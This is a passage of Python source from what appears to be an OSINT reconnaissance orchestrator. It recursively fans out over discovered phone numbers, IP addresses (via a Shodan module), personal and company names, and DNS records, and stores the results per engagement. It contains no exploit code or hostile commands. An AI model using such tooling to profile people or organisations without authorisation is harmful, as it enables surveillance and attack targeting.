                progress_callback=_record_batch_progress,
            )
            if len(scheduled_phone_entries) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.L phone schedule reduction",
                    f"[dim]parallel parse x{min(parallel_workers, len(scheduled_phone_entries))}[/dim]",
                )
            prepared_phone_schedule = _run_inprocess_batch(
                scheduled_phone_entries,
                _prepare_simple_schedule_reduction_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.L phone schedule reduction",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_phone_schedule) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.L phone batch reduction",
                    f"[dim]parallel parse x{min(parallel_workers, len(prepared_phone_schedule))}[/dim]",
                )
            prepared_phone_batch = _run_inprocess_batch(
                prepared_phone_schedule,
                _prepare_simple_batch_reduction_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.L phone batch reduction",
                progress_callback=_record_batch_progress,
            )
            phone_batch: list[str] = []
            _run_ordered_inprocess_apply_batch(
                prepared_phone_batch,
                lambda item: _apply_simple_limited_batch_item(
                    item,
                    batch_out=phone_batch,
                    limit=10,
                ),
                progress_label=f"{iteration}.L phone batch apply",
                progress_callback=_record_batch_progress,
                order_note="phone batch order preserved",
            )
            if len(phone_batch) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.L phone spec prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(phone_batch))}[/dim]",
                )
            phone_specs = _run_inprocess_batch(
                phone_batch,
                lambda phone_seed: ModuleDispatchSpec(
                    cmd_argv=["osint", "phone", "--engagement", engagement, "--number", phone_seed],
                    label=f"{iteration}.L phone fan-out ({phone_seed})",
                    loop_name="fanout_l_seed_phone",
                    seed_contexts=[
                        _seed_context(phone_seed, "phone", source="discovered", confidence=0.9)
                    ],
                    metadata={"iteration": iteration},
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.L phone spec prep",
                progress_callback=_record_batch_progress,
            )
            if len(phone_specs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.L phone fan-out",
                    f"[dim]parallel dispatch x{min(parallel_workers, len(phone_specs))}[/dim]",
                )
            _run_module_batch(
                phone_specs,
                _run_module,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.L phone fan-out",
                progress_callback=_record_batch_progress,
            )
            if len(phone_batch) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.L phone processed-seed prep",
                    (
                        f"[dim]parallel parse x"
                        f"{min(parallel_workers, len(phone_batch))}[/dim]"
                    ),
                )
            prepared_phone_updates = _run_inprocess_batch(
                phone_batch,
                lambda item: _prepare_processed_set_item(
                    item,
                    normalizer=_resume_normalize,
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.L phone processed-seed prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_phone_updates) > 1:
                _log(
                    f"{iteration}.L phone processed-seed update",
                    "[dim]sequential dispatch x1[/dim]  [dim]processed-seed order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_phone_updates,
                lambda item: _apply_processed_set_item(
                    item,
                    processed_set=processed_phone_seeds,
                ),
                max_workers=1,
                progress_label=f"{iteration}.L phone processed-seed update",
                progress_callback=_record_batch_progress,
            )
        elif iteration == 1 and (seed_type == "phone" or extra_phone_seeds):
            _emit_no_pending_resume_skip_log(
                f"{iteration}.L phone fan-out",
                "[dim]resume skip — no pending phone seeds[/dim]",
                progress_label_prefix=f"{iteration}.L phone",
                max_workers=parallel_workers,
                progress_callback=_record_batch_progress,
            )

        # ─── Fan-out O: IP-seed recursive invocation ──────────────────
        # Runs on operator-provided IPv4/IPv6 seeds and newly promoted
        # host IP pivots so host-detail enrichment participates in the
        # same recursive model as the other specialised seed types.
        pending_ipv4_seeds = _load_new_seed_values(
            "ipv4",
            processed_ip_seeds,
            max_workers=parallel_workers,
            progress_label=f"{iteration}.O ipv4 seed load prep",
            progress_callback=_record_batch_progress,
        )
        pending_ipv6_seeds = _load_new_seed_values(
            "ipv6",
            processed_ip_seeds,
            max_workers=parallel_workers,
            progress_label=f"{iteration}.O ipv6 seed load prep",
            progress_callback=_record_batch_progress,
        )
        ip_seed_candidates = [*sorted(pending_ipv4_seeds), *sorted(pending_ipv6_seeds)]
        if ip_seed_candidates and len(ip_seed_candidates) > 1 and parallel_workers > 1:
            _log(
                f"{iteration}.O ip seed classify",
                f"[dim]parallel parse x{min(parallel_workers, len(ip_seed_candidates))}[/dim]",
            )
        prepared_ip_entries = _run_inprocess_batch(
            ip_seed_candidates,
            lambda ip_seed: (ip_seed, _resume_normalize(ip_seed), _classify_seed(ip_seed)),
            max_workers=parallel_workers,
            progress_label=f"{iteration}.O ip seed classify",
            progress_callback=_record_batch_progress,
        )
        pending_ip_entries: list[tuple[str, str]] = []
        seen_ip_values: set[str] = set()
        if len(prepared_ip_entries) > 1 and parallel_workers > 1:
            _log(
                f"{iteration}.O ip seed schedule prep",
                f"[dim]parallel parse x{min(parallel_workers, len(prepared_ip_entries))}[/dim]",
            )
        scheduled_ip_entries = _run_inprocess_batch(
            prepared_ip_entries,
            lambda item: {
                "normalized_ip": str(item[1] or "").strip(),
                "pending_entry": (
                    (str(item[0]), str(item[2]))
                    if str(item[1] or "").strip()
                    else None
                ),
            },
            max_workers=parallel_workers,
            progress_label=f"{iteration}.O ip seed schedule prep",
            progress_callback=_record_batch_progress,
        )
        if len(scheduled_ip_entries) > 1 and parallel_workers > 1:
            _log(
                f"{iteration}.O ip seed schedule reduction",
                f"[dim]parallel parse x{min(parallel_workers, len(scheduled_ip_entries))}[/dim]",
            )
        prepared_ip_schedule = _run_inprocess_batch(
            scheduled_ip_entries,
            _prepare_ip_schedule_reduction,
            max_workers=parallel_workers,
            progress_label=f"{iteration}.O ip seed schedule reduction",
            progress_callback=_record_batch_progress,
        )
        if len(prepared_ip_schedule) > 1 and parallel_workers > 1:
            _log(
                f"{iteration}.O ip batch reduction",
                f"[dim]parallel parse x{min(parallel_workers, len(prepared_ip_schedule))}[/dim]",
            )
        prepared_ip_batch_entries = _run_inprocess_batch(
            prepared_ip_schedule,
            _prepare_ip_batch_reduction_item,
            max_workers=parallel_workers,
            progress_label=f"{iteration}.O ip batch reduction",
            progress_callback=_record_batch_progress,
        )
        if len(prepared_ip_batch_entries) > 1:
            _log(
                f"{iteration}.O ip batch merge",
                "[dim]sequential dispatch x1[/dim]  [dim]pending-entry order preserved[/dim]",
            )
        _run_inprocess_batch(
            prepared_ip_batch_entries,
            lambda item: _apply_ip_batch_reduction_item(
                item,
                pending_entries_out=pending_ip_entries,
                seen_ip_values_out=seen_ip_values,
            ),
            max_workers=1,
            progress_label=f"{iteration}.O ip batch merge",
            progress_callback=_record_batch_progress,
        )
        if pending_ip_entries:
            ip_batch = pending_ip_entries[:10]
            if len(ip_batch) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.O ip spec prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(ip_batch))}[/dim]",
                )
            ip_specs = _run_inprocess_batch(
                ip_batch,
                lambda item: ModuleDispatchSpec(
                    cmd_argv=["osint", "shodan", "--engagement", engagement, "--target", item[0]],
                    label=f"{iteration}.O ip fan-out ({item[0]})",
                    loop_name="fanout_o_seed_ip",
                    seed_contexts=[
                        _seed_context(item[0], item[1], source="discovered", confidence=0.9)
                    ],
                    metadata={"iteration": iteration},
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.O ip spec prep",
                progress_callback=_record_batch_progress,
            )
            if len(ip_specs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.O ip fan-out",
                    (
                        f"[dim]provider-bounded dispatch x"
                        f"{min(_provider_limited_worker_count(ip_specs, parallel_workers), len(ip_specs))}[/dim]"
                    ),
                )
            _run_module_batch(
                ip_specs,
                _run_module,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.O ip fan-out",
                progress_callback=_record_batch_progress,
            )
            if len(ip_batch) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.O ip processed-seed prep",
                    (
                        f"[dim]parallel parse x"
                        f"{min(parallel_workers, len(ip_batch))}[/dim]"
                    ),
                )
            prepared_ip_updates = _run_inprocess_batch(
                ip_batch,
                lambda item: _prepare_processed_set_item(
                    item[0],
                    normalizer=_resume_normalize,
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.O ip processed-seed prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_ip_updates) > 1:
                _log(
                    f"{iteration}.O ip processed-seed update",
                    "[dim]sequential dispatch x1[/dim]  [dim]processed-seed order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_ip_updates,
                lambda item: _apply_processed_set_item(
                    item,
                    processed_set=processed_ip_seeds,
                ),
                max_workers=1,
                progress_label=f"{iteration}.O ip processed-seed update",
                progress_callback=_record_batch_progress,
            )
        elif iteration == 1 and (seed_type in {"ipv4", "ipv6"} or extra_ip_seeds):
            _emit_no_pending_resume_skip_log(
                f"{iteration}.O ip fan-out",
                "[dim]resume skip — no pending IP seeds[/dim]",
                progress_label_prefix=f"{iteration}.O ip",
                max_workers=parallel_workers,
                progress_callback=_record_batch_progress,
            )

        # ─── Fan-out M: name-seed recursive invocation ────────────────
        # Runs on operator-provided names and cross-referenced names that
        # surfaced from social/profile enrichment.
        pending_name_seeds = _load_new_seed_values(
            "name",
            processed_name_seeds,
            max_workers=parallel_workers,
            progress_label=f"{iteration}.M name seed load prep",
            progress_callback=_record_batch_progress,
        )
        if pending_name_seeds:
            name_schedule_inputs = sorted(pending_name_seeds)
            if len(name_schedule_inputs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.M name schedule prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(name_schedule_inputs))}[/dim]",
                )
            scheduled_name_entries = _run_inprocess_batch(
                name_schedule_inputs,
                lambda name_seed: str(name_seed),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.M name schedule prep",
                progress_callback=_record_batch_progress,
            )
            if len(scheduled_name_entries) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.M name schedule reduction",
                    f"[dim]parallel parse x{min(parallel_workers, len(scheduled_name_entries))}[/dim]",
                )
            prepared_name_schedule = _run_inprocess_batch(
                scheduled_name_entries,
                _prepare_simple_schedule_reduction_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.M name schedule reduction",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_name_schedule) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.M name batch reduction",
                    f"[dim]parallel parse x{min(parallel_workers, len(prepared_name_schedule))}[/dim]",
                )
            prepared_name_batch = _run_inprocess_batch(
                prepared_name_schedule,
                _prepare_simple_batch_reduction_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.M name batch reduction",
                progress_callback=_record_batch_progress,
            )
            name_batch: list[str] = []
            _run_ordered_inprocess_apply_batch(
                prepared_name_batch,
                lambda item: _apply_simple_limited_batch_item(
                    item,
                    batch_out=name_batch,
                    limit=10,
                ),
                progress_label=f"{iteration}.M name batch apply",
                progress_callback=_record_batch_progress,
                order_note="name batch order preserved",
            )
            if len(name_batch) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.M name spec prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(name_batch))}[/dim]",
                )
            name_specs = _run_inprocess_batch(
                name_batch,
                lambda name_seed: ModuleDispatchSpec(
                    cmd_argv=["osint", "name", "--engagement", engagement, "--name", name_seed],
                    label=f"{iteration}.M name fan-out ({name_seed})",
                    loop_name="fanout_m_seed_name",
                    seed_contexts=[
                        _seed_context(name_seed, "name", source="discovered", confidence=0.9)
                    ],
                    metadata={"iteration": iteration},
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.M name spec prep",
                progress_callback=_record_batch_progress,
            )
            if len(name_specs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.M name fan-out",
                    f"[dim]parallel dispatch x{min(parallel_workers, len(name_specs))}[/dim]",
                )
            _run_module_batch(
                name_specs,
                _run_module,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.M name fan-out",
                progress_callback=_record_batch_progress,
            )
            if len(name_batch) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.M name processed-seed prep",
                    (
                        f"[dim]parallel parse x"
                        f"{min(parallel_workers, len(name_batch))}[/dim]"
                    ),
                )
            prepared_name_updates = _run_inprocess_batch(
                name_batch,
                lambda item: _prepare_processed_set_item(
                    item,
                    normalizer=_resume_normalize,
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.M name processed-seed prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_name_updates) > 1:
                _log(
                    f"{iteration}.M name processed-seed update",
                    "[dim]sequential dispatch x1[/dim]  [dim]processed-seed order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_name_updates,
                lambda item: _apply_processed_set_item(
                    item,
                    processed_set=processed_name_seeds,
                ),
                max_workers=1,
                progress_label=f"{iteration}.M name processed-seed update",
                progress_callback=_record_batch_progress,
            )
        elif iteration == 1 and (seed_type == "name" or extra_name_seeds):
            _emit_no_pending_resume_skip_log(
                f"{iteration}.M name fan-out",
                "[dim]resume skip — no pending name seeds[/dim]",
                progress_label_prefix=f"{iteration}.M name",
                max_workers=parallel_workers,
                progress_callback=_record_batch_progress,
            )

        # ─── Fan-out N: company-seed recursive invocation ─────────────
        # Reuses the public entity-search path so organisation names can
        # participate in the same recursive deepening model as people.
        pending_company_seeds = _load_new_seed_values(
            "company",
            processed_company_seeds,
            max_workers=parallel_workers,
            progress_label=f"{iteration}.N company seed load prep",
            progress_callback=_record_batch_progress,
        )
        if pending_company_seeds:
            company_schedule_inputs = sorted(pending_company_seeds)
            if len(company_schedule_inputs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.N company schedule prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(company_schedule_inputs))}[/dim]",
                )
            scheduled_company_entries = _run_inprocess_batch(
                company_schedule_inputs,
                lambda company_seed: str(company_seed),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.N company schedule prep",
                progress_callback=_record_batch_progress,
            )
            if len(scheduled_company_entries) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.N company schedule reduction",
                    f"[dim]parallel parse x{min(parallel_workers, len(scheduled_company_entries))}[/dim]",
                )
            prepared_company_schedule = _run_inprocess_batch(
                scheduled_company_entries,
                _prepare_simple_schedule_reduction_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.N company schedule reduction",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_company_schedule) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.N company batch reduction",
                    f"[dim]parallel parse x{min(parallel_workers, len(prepared_company_schedule))}[/dim]",
                )
            prepared_company_batch = _run_inprocess_batch(
                prepared_company_schedule,
                _prepare_simple_batch_reduction_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.N company batch reduction",
                progress_callback=_record_batch_progress,
            )
            company_batch: list[str] = []
            _run_ordered_inprocess_apply_batch(
                prepared_company_batch,
                lambda item: _apply_simple_limited_batch_item(
                    item,
                    batch_out=company_batch,
                    limit=10,
                ),
                progress_label=f"{iteration}.N company batch apply",
                progress_callback=_record_batch_progress,
                order_note="company batch order preserved",
            )
            if len(company_batch) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.N company spec prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(company_batch))}[/dim]",
                )
            company_specs = _run_inprocess_batch(
                company_batch,
                lambda company_seed: ModuleDispatchSpec(
                    cmd_argv=["osint", "name", "--engagement", engagement, "--name", company_seed],
                    label=f"{iteration}.N company fan-out ({company_seed})",
                    loop_name="fanout_n_seed_company",
                    seed_contexts=[
                        _seed_context(company_seed, "company", source="discovered", confidence=0.9)
                    ],
                    metadata={"iteration": iteration},
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.N company spec prep",
                progress_callback=_record_batch_progress,
            )
            if len(company_specs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.N company fan-out",
                    f"[dim]parallel dispatch x{min(parallel_workers, len(company_specs))}[/dim]",
                )
            _run_module_batch(
                company_specs,
                _run_module,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.N company fan-out",
                progress_callback=_record_batch_progress,
            )
            if len(company_batch) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.N company processed-seed prep",
                    (
                        f"[dim]parallel parse x"
                        f"{min(parallel_workers, len(company_batch))}[/dim]"
                    ),
                )
            prepared_company_updates = _run_inprocess_batch(
                company_batch,
                lambda item: _prepare_processed_set_item(
                    item,
                    normalizer=_resume_normalize,
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.N company processed-seed prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_company_updates) > 1:
                _log(
                    f"{iteration}.N company processed-seed update",
                    "[dim]sequential dispatch x1[/dim]  [dim]processed-seed order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_company_updates,
                lambda item: _apply_processed_set_item(
                    item,
                    processed_set=processed_company_seeds,
                ),
                max_workers=1,
                progress_label=f"{iteration}.N company processed-seed update",
                progress_callback=_record_batch_progress,
            )
        elif iteration == 1 and (seed_type == "company" or extra_company_seeds):
            _emit_no_pending_resume_skip_log(
                f"{iteration}.N company fan-out",
                "[dim]resume skip — no pending company seeds[/dim]",
                progress_label_prefix=f"{iteration}.N company",
                max_workers=parallel_workers,
                progress_callback=_record_batch_progress,
            )

        # ─── Fan-out G: DNS record enrichment ─────────────────────────
        # Query MX / TXT / NS / CNAME for root + top subdomains. TXT tokens
        # reveal SaaS the org uses (Google Workspace, O365, Slack, Zoom,
        # Stripe, Salesforce, etc.) - each becomes a signal for the report
        # and a hint for further recon (verify token subdomains, tenants).
        if not root_domains:
            _emit_no_domain_skip_log(
                f"{iteration}.G DNS enrichment",
                f"[dim]skipped (seed_type={seed_type} has no domain)[/dim]",
                progress_label_prefix=f"{iteration}.G DNS",
                max_workers=parallel_workers,
                progress_callback=_record_batch_progress,
            )
        elif dry_run_all:
            _emit_prepared_notice_log(
                f"{iteration}.G DNS enrichment",
                "[yellow]DRY-RUN-ALL[/yellow] would query MX/TXT/NS/CNAME",
                progress_label_prefix=f"{iteration}.G DNS",
                notice_suffix="dry-run",
                order_note="dry-run notice order preserved",
                max_workers=parallel_workers,
                progress_callback=_record_batch_progress,
            )
            pending_dns_domains, skipped_dns_domains = _partition_root_domains(
                root_domains,
                completed_domains=completed_dns_domains,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.G root-domain prep",
                progress_callback=_record_batch_progress,
            )
            dns_resume_skip_log_inputs = [
                (f"{iteration}.G DNS enrichment", root_domain)
                for root_domain in skipped_dns_domains
            ]
            if len(dns_resume_skip_log_inputs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.G DNS skip-log prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(dns_resume_skip_log_inputs))}[/dim]",
                )
            prepared_dns_resume_skip_logs = _run_inprocess_batch(
                dns_resume_skip_log_inputs,
                _prepare_resume_skip_log_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.G DNS skip-log prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_dns_resume_skip_logs) > 1:
                _log(
                    f"{iteration}.G DNS skip-log merge",
                    "[dim]sequential dispatch x1[/dim]  [dim]resume-skip log order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_dns_resume_skip_logs,
                _apply_prepared_log_entry,
                max_workers=1,
                progress_label=f"{iteration}.G DNS skip-log merge",
                progress_callback=_record_batch_progress,
            )
            dns_dry_run_entries = [
                (root_domain, "fanout_g_dns")
                for root_domain in pending_dns_domains
            ]
            if len(dns_dry_run_entries) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.G dry-run finalize prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(dns_dry_run_entries))}[/dim]",
                )
            prepared_dns_dry_run_entries = _run_inprocess_batch(
                dns_dry_run_entries,
                _prepare_domain_dry_run_skip_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.G dry-run finalize prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_dns_dry_run_entries) > 1:
                _log(
                    f"{iteration}.G dry-run finalize",
                    "[dim]sequential dispatch x1[/dim]  [dim]dry-run skip order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_dns_dry_run_entries,
                _apply_domain_dry_run_skip_entry,
                max_workers=1,
                progress_label=f"{iteration}.G dry-run finalize",
                progress_callback=_record_batch_progress,
            )
        else:
            pending_dns_domains, skipped_dns_domains = _partition_root_domains(
                root_domains,
                completed_domains=completed_dns_domains,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.G root-domain prep",
                progress_callback=_record_batch_progress,
            )
            dns_resume_skip_log_inputs = [
                (f"{iteration}.G DNS enrichment", root_domain)
                for root_domain in skipped_dns_domains
            ]
            if len(dns_resume_skip_log_inputs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.G DNS skip-log prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(dns_resume_skip_log_inputs))}[/dim]",
                )
            prepared_dns_resume_skip_logs = _run_inprocess_batch(
                dns_resume_skip_log_inputs,
                _prepare_resume_skip_log_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.G DNS skip-log prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_dns_resume_skip_logs) > 1:
                _log(
                    f"{iteration}.G DNS skip-log merge",
                    "[dim]sequential dispatch x1[/dim]  [dim]resume-skip log order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_dns_resume_skip_logs,
                _apply_prepared_log_entry,
                max_workers=1,
                progress_label=f"{iteration}.G DNS skip-log merge",
                progress_callback=_record_batch_progress,
            )
            if not pending_dns_domains:
                _emit_no_pending_resume_skip_log(
                    f"{iteration}.G DNS enrichment",
                    "[dim]resume skip — no pending root domains[/dim]",
                    progress_label_prefix=f"{iteration}.G DNS",
                    max_workers=parallel_workers,
                    progress_callback=_record_batch_progress,
                )
                dns_total_added = 0
                aggregate_saas_signals: list[str] = []
                total_dns_hosts_queried = 0
            else:
                known_dns_hosts = _load_known_hostnames(
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.G known host prep",
                    progress_callback=_record_batch_progress,
                )[:10]
                dns_handles = _start_seed_run_handles_from_contexts(
                    [
                        _seed_context(
                            root_domain,
                            "domain",
                            source="orchestrator",
                            metadata={"iteration": iteration},
                        )
                        for root_domain in pending_dns_domains
                    ],
                    loop_name_value="fanout_g_dns",
                    base_metadata_value={},
                    progress_label_prefix=f"{iteration}.G DNS",
                )
                dns_workers = _dns_worker_count(parallel_workers)
                if len(pending_dns_domains) > 1 and dns_workers > 1:
                    _log(
                        f"{iteration}.G DNS enrichment",
                        f"[dim]parallel dispatch x{min(dns_workers, len(pending_dns_domains))}[/dim]",
                    )
                dns_results = _run_callable_batch(
                    pending_dns_domains,
                    lambda root_domain: _dns_probe_root_domain(
                        root_domain,
                        known_dns_hosts,
                        max_workers=dns_workers,
                        progress_label=f"{iteration}.G DNS record lookup",
                    ),
                    max_workers=dns_workers,
                    progress_label=f"{iteration}.G DNS enrichment",
                    progress_callback=_record_batch_progress,
                )
                dns_parse_items: list[tuple[str, Any]] = []
                _run_ordered_inprocess_apply_batch(
                    list(enumerate(dns_results)),
                    lambda item: _apply_indexed_pair_item(
                        item,
                        leading_values=pending_dns_domains,
                        pair_items_out=dns_parse_items,
                    ),
                    progress_label=f"{iteration}.G DNS result input apply",
                    progress_callback=_record_batch_progress,
                    order_note="DNS result input order preserved",
                )
                if len(dns_parse_items) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.G DNS result parse",
                        f"[dim]parallel parse x{min(parallel_workers, len(dns_parse_items))}[/dim]",
                    )
                prepared_dns_results = _run_inprocess_batch(
                    dns_parse_items,
                    _prepare_dns_result,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.G DNS result parse",
                    progress_callback=_record_batch_progress,
                )
                dns_result_prep_items: list[tuple[Any, Any]] = []
                _run_ordered_inprocess_apply_batch(
                    list(enumerate(prepared_dns_results)),
                    lambda item: _apply_indexed_pair_item(
                        item,
                        leading_values=dns_handles,
                        pair_items_out=dns_result_prep_items,
                    ),
                    progress_label=f"{iteration}.G DNS result prep apply",
                    progress_callback=_record_batch_progress,
                    order_note="DNS result handle order preserved",
                )
                if len(dns_result_prep_items) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.G DNS result prep",
                        f"[dim]parallel parse x{min(parallel_workers, len(dns_result_prep_items))}[/dim]",
                    )
                prepared_dns_domain_results = _run_inprocess_batch(
                    dns_result_prep_items,
                    _prepare_dns_domain_result_entry,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.G DNS result prep",
                    progress_callback=_record_batch_progress,
                )
                dns_total_added = 0
                total_dns_hosts_queried = 0
                aggregate_signals_set: set[str] = set()
                con = _sq.connect(db_path)
                try:
                    existing_host_rows = con.execute(
                        "SELECT hostname FROM hosts WHERE engagement_id=? "
                        "AND hostname IS NOT NULL",
                        (engagement_id,),
                    ).fetchall()
                    existing = _collect_normalized_text_row_value_set(
                        existing_host_rows,
                        normalizer=lambda value: str(value or "").strip().lower(),
                        max_workers=parallel_workers,
                        row_progress_label=_derive_child_progress_label(
                            f"{iteration}.G DNS result prep",
                            "existing row prep",
                        ),
                        set_progress_label=_derive_child_progress_label(
                            f"{iteration}.G DNS result prep",
                            "existing set prep",
                        ),
                        progress_callback=_record_batch_progress,
                    )
                    existing_seed_rows = con.execute(
                        """
                        SELECT seed_value
                        FROM engagement_seeds
                        WHERE engagement_id=?
                          AND seed_type='subdomain'
                        """,
                        (engagement_id,),
                    ).fetchall()
                    existing_seed_hosts = _collect_normalized_text_row_value_set(
                        existing_seed_rows,
                        normalizer=lambda value: str(value or "").strip().lower(),
                        max_workers=parallel_workers,
                        row_progress_label=_derive_child_progress_label(
                            f"{iteration}.G DNS result prep",
                            "seed row prep",
                        ),
                        set_progress_label=_derive_child_progress_label(
                            f"{iteration}.G DNS result prep",
                            "seed set prep",
                        ),
                        progress_callback=_record_batch_progress,
                    )
                    if len(prepared_dns_domain_results) > 1 and parallel_workers > 1:
                        _log(
                            f"{iteration}.G DNS CNAME prep",
                            (
                                f"[dim]parallel parse x"
                                f"{min(parallel_workers, len(prepared_dns_domain_results))}[/dim]"
                            ),
                        )
                    prepared_dns_cname_input_groups = _run_inprocess_batch(
                        prepared_dns_domain_results,
                        _prepare_dns_cname_resolution_input_group,
                        max_workers=parallel_workers,
                        progress_label=f"{iteration}.G DNS CNAME prep",
                        progress_callback=_record_batch_progress,
                    )
                    dns_cname_resolution_inputs: list[str] = []
                    seen_dns_cname_resolution_inputs: set[str] = set()
                    if len(prepared_dns_cname_input_groups) > 1:
                        _log(
                            f"{iteration}.G DNS CNAME merge",
                            "[dim]sequential dispatch x1[/dim]  [dim]deduped target order preserved[/dim]",
                        )
                    _run_inprocess_batch(
                        prepared_dns_cname_input_groups,
                        lambda item: _apply_dns_cname_resolution_input_group(
                            item,
                            resolution_inputs_out=dns_cname_resolution_inputs,
                            seen_resolution_inputs_out=seen_dns_cname_resolution_inputs,
                            existing_hosts=existing,
                        ),
                        max_workers=1,
                        progress_label=f"{iteration}.G DNS CNAME merge",
                        progress_callback=_record_batch_progress,
                    )
                    resolved_dns_cname_map: dict[str, dict[str, object]] = {}
                    if dns_cname_resolution_inputs:
                        if len(dns_cname_resolution_inputs) > 1 and parallel_workers > 1:
                            _log(
                                f"{iteration}.G DNS host resolve",
                                f"[dim]parallel parse x{min(parallel_workers, len(dns_cname_resolution_inputs))}[/dim]",
                            )
                        resolved_dns_cname_entries = _run_inprocess_batch(
                            dns_cname_resolution_inputs,
                            _prepare_resolved_hostname_item,
                            max_workers=parallel_workers,
                            progress_label=f"{iteration}.G DNS host resolve",
                            progress_callback=_record_batch_progress,
                        )
                        _run_inprocess_batch(
                            resolved_dns_cname_entries,
                            lambda item: _apply_resolved_hostname_map_item(
                                item,
                                resolved_map_out=resolved_dns_cname_map,
                            ),
                            max_workers=1,
                            progress_label=f"{iteration}.G DNS host resolve apply",
                            progress_callback=_record_batch_progress,
                        )
                    if len(prepared_dns_domain_results) > 1:
                        _log(
                            f"{iteration}.G DNS finalize",
                            "[dim]sequential dispatch x1[/dim]  [dim]shared-connection order preserved[/dim]",
                        )
                    applied_dns_domain_results = _run_inprocess_batch(
                        prepared_dns_domain_results,
                        lambda item: _apply_dns_domain_result_entry(
                            item,
                            con=con,
                            existing_seed_hosts=existing_seed_hosts,
                            existing_hosts=existing,
                            resolved_cname_map=resolved_dns_cname_map,
                        ),
                        max_workers=1,
                        progress_label=f"{iteration}.G DNS finalize",
                        progress_callback=_record_batch_progress,
                    )
                    if len(applied_dns_domain_results) > 1 and parallel_workers > 1:
                        _log(
                            f"{iteration}.G DNS finalize prep",
                            (
                                f"[dim]parallel parse x"
                                f"{min(parallel_workers, len(applied_dns_domain_results))}[/dim]"
                            ),
                        )
                    prepared_dns_finalize_entries = _run_inprocess_batch(
                        applied_dns_domain_results,
                        _prepare_dns_domain_finalize_entry,
                        max_workers=parallel_workers,
                        progress_label=f"{iteration}.G DNS finalize prep",
                        progress_callback=_record_batch_progress,
                    )
                    _run_inprocess_batch(
                        prepared_dns_finalize_entries,
                        _apply_module_seed_run_finalization_entry,
                        max_workers=1,
                        progress_label=f"{iteration}.G DNS finalize apply",
                        progress_callback=_record_batch_progress,
                    )
                    if len(applied_dns_domain_results) > 1 and parallel_workers > 1:
                        _log(
                            f"{iteration}.G DNS summary prep",
                            (
                                f"[dim]parallel parse x"
                                f"{min(parallel_workers, len(applied_dns_domain_results))}[/dim]"
                            ),
                        )
